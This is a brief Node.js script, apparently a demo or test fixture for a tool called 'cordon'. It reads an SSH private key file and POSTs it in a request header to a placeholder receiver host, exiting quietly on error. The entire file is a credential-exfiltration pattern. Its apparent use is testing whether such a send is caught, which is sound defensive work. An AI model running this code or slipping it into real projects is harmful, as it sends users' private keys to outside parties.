const fs = require("node:fs");
const https = require("node:https");

const fakeCredential = fs.readFileSync("/home/cordon/.ssh/id_ed25519", "utf8");
const request = https.request("https://cordon-demo-receiver.example.invalid/collect", {
  method: "POST",
  headers: { "x-cordon-demo": fakeCredential },
});
request.on("error", () => process.exit(0));
request.end();
